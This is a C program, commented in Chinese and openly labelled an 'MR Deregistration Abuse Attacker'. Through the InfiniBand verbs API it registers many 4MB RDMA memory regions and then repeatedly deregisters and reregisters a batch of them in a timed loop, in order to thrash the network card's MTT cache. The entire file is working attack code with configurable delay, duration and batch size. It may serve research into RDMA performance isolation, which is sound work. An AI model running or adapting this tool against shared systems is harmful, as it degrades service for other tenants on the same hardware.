/*
 * MR注销滥用攻击程序
 * 
 * 攻击策略：
 * 1. 初始注册大量MR（50个，每个4MB）
 * 2. 反复注销并重新注册其中一部分（10个）
 * 3. 这会导致NIC的MTT缓存抖动
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <infiniband/verbs.h>

#define MR_SIZE (4 * 1024 * 1024)  // 4MB
#define DEFAULT_NUM_MRS 50
#define DEFAULT_BATCH_SIZE 10
#define DEFAULT_DELAY_MS 5000
#define DEFAULT_DURATION_MS 25000

static inline void print_usage(const char *prog) {
    printf("Usage: %s [options]\n", prog);
    printf("Options:\n");
    printf("  -d, --delay=MS        Delay before starting attack (default: %d ms)\n", DEFAULT_DELAY_MS);
    printf("  -t, --duration=MS     Attack duration (default: %d ms)\n", DEFAULT_DURATION_MS);
    printf("  -n, --num-mrs=N       Number of MRs to register (default: %d)\n", DEFAULT_NUM_MRS);
    printf("  -b, --batch-size=N    Batch size for deregister/reregister (default: %d)\n", DEFAULT_BATCH_SIZE);
    printf("  -h, --help            Show this help\n");
}

int main(int argc, char *argv[]) {
    int delay_ms = DEFAULT_DELAY_MS;
    int duration_ms = DEFAULT_DURATION_MS;
    int num_mrs = DEFAULT_NUM_MRS;
    int batch_size = DEFAULT_BATCH_SIZE;
    
    static struct option long_options[] = {
        {"delay", required_argument, 0, 'd'},
        {"duration", required_argument, 0, 't'},
        {"num-mrs", required_argument, 0, 'n'},
        {"batch-size", required_argument, 0, 'b'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };
    
    int opt;
    while ((opt = getopt_long(argc, argv, "d:t:n:b:h", long_options, NULL)) != -1) {
        switch (opt) {
            case 'd': delay_ms = atoi(optarg); break;
            case 't': duration_ms = atoi(optarg); break;
            case 'n': num_mrs = atoi(optarg); break;
            case 'b': batch_size = atoi(optarg); break;
            case 'h': print_usage(argv[0]); return 0;
            default: print_usage(argv[0]); return 1;
        }
    }
    
    printf("========================================\n");
    printf("MR Deregistration Abuse Attacker\n");
    printf("========================================\n");
    printf("Delay:       %d ms\n", delay_ms);
    printf("Duration:    %d ms\n", duration_ms);
    printf("Num MRs:     %d\n", num_mrs);
    printf("Batch size:  %d\n", batch_size);
    printf("MR size:     %d MB\n", MR_SIZE / (1024*1024));
    printf("========================================\n");
    
    // Phase 0: 延迟
    if (delay_ms > 0) {
        printf("[Phase 0] Waiting %d ms before attack...\n", delay_ms);
        usleep(delay_ms * 1000);
    }
    
    // 打开设备
    struct ibv_device **dev_list = ibv_get_device_list(NULL);
    if (!dev_list || !dev_list[0]) {
        fprintf(stderr, "No IB device found\n");
        return 1;
    }
    
    struct ibv_context *ctx = ibv_open_device(dev_list[0]);
    struct ibv_pd *pd = ibv_alloc_pd(ctx);
    
    // 分配缓冲区
    void **buffers = calloc(num_mrs, sizeof(void*));
    struct ibv_mr **mrs = calloc(num_mrs, sizeof(struct ibv_mr*));
    
    for (int i = 0; i < num_mrs; i++) {
        buffers[i] = aligned_alloc(4096, MR_SIZE);
        mrs[i] = NULL;
    }
    
    // Phase 1: 初始注册所有MR
    printf("[Phase 1] Registering %d MRs...\n", num_mrs);
    int registered = 0;
    for (int i = 0; i < num_mrs; i++) {
        mrs[i] = ibv_reg_mr(pd, buffers[i], MR_SIZE, IBV_ACCESS_LOCAL_WRITE);
        if (mrs[i]) {
            registered++;
        } else {
            printf("[WARN] Failed to register MR %d (errno=%d)\n", i, errno);
            // 继续尝试注册其他的
        }
    }
    printf("[Phase 1] Successfully registered %d/%d MRs\n", registered, num_mrs);
    
    if (registered < batch_size) {
        printf("[ERROR] Not enough MRs registered for attack. Need at least %d\n", batch_size);
        goto cleanup;
    }
    
    // Phase 2: 攻击循环
    printf("[Phase 2] Starting attack loop (deregister/reregister %d MRs)...\n", batch_size);
    printf("[Phase 2] Running for %d ms...\n", duration_ms);
    
    struct timespec start, now;
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    long cycles = 0;
    while (1) {
        // 检查时间
        clock_gettime(CLOCK_MONOTONIC, &now);
        long elapsed_ms = (now.tv_sec - start.tv_sec) * 1000 + 
                          (now.tv_nsec - start.tv_nsec) / 1000000;
        if (elapsed_ms >= duration_ms) break;
        
        // 注销一批MR
        for (int i = 0; i < batch_size; i++) {
            if (mrs[i]) {
                ibv_dereg_mr(mrs[i]);
                mrs[i] = NULL;
            }
        }
        
        // 立即重新注册
        for (int i = 0; i < batch_size; i++) {
            mrs[i] = ibv_reg_mr(pd, buffers[i], MR_SIZE, IBV_ACCESS_LOCAL_WRITE);
            if (!mrs[i]) {
                // 如果重新注册失败（比如配额限制），暂停一下再试
                usleep(1000);
                mrs[i] = ibv_reg_mr(pd, buffers[i], MR_SIZE, IBV_ACCESS_LOCAL_WRITE);
            }
        }
        
        cycles++;
        
        // 每10000个周期打印一次状态
        if (cycles % 10000 == 0) {
            printf("[Phase 2] Cycles: %ld, Elapsed: %ld ms\n", cycles, elapsed_ms);
        }
    }
    
    clock_gettime(CLOCK_MONOTONIC, &now);
    long total_elapsed_ms = (now.tv_sec - start.tv_sec) * 1000 + 
                            (now.tv_nsec - start.tv_nsec) / 1000000;
    
    printf("[Phase 2] Attack completed. Total cycles: %ld in %ld ms\n", cycles, total_elapsed_ms);
    printf("[Phase 2] Cycles per second: %.1f\n", cycles * 1000.0 / total_elapsed_ms);

cleanup:
    // 清理
    for (int i = 0; i < num_mrs; i++) {
        if (mrs[i]) ibv_dereg_mr(mrs[i]);
        if (buffers[i]) free(buffers[i]);
    }
    free(buffers);
    free(mrs);
    
    ibv_dealloc_pd(pd);
    ibv_close_device(ctx);
    ibv_free_device_list(dev_list);
    
    return 0;
}
